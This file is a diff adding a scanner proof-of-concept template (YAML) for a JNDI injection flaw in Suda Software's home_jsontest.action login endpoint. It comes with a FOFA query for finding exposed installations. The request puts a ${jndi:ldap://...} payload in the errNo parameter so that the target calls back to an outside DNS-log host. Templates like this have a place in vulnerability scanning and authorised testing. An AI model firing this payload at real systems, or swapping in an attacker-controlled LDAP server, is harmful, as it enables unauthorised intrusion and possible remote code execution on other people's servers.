@@ -1,0 +1,18 @@
+id: poc-yaml-suda-software-home-jsontest-jnidi
+info:
+  name: 速达软件 home_jsontest JNID注入漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - LDAP注入
+  - 两高一弱
+  finger: 速达软件
+  fofa: body="速达软件技术"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /login/home_jsontest.action?reqType=json&ISLOGIN=TRUE&eid=1&msg=1&errNo=${jndi:ldap://{{.domain}}}
+  expression: reverse.Verify()
+transport: http
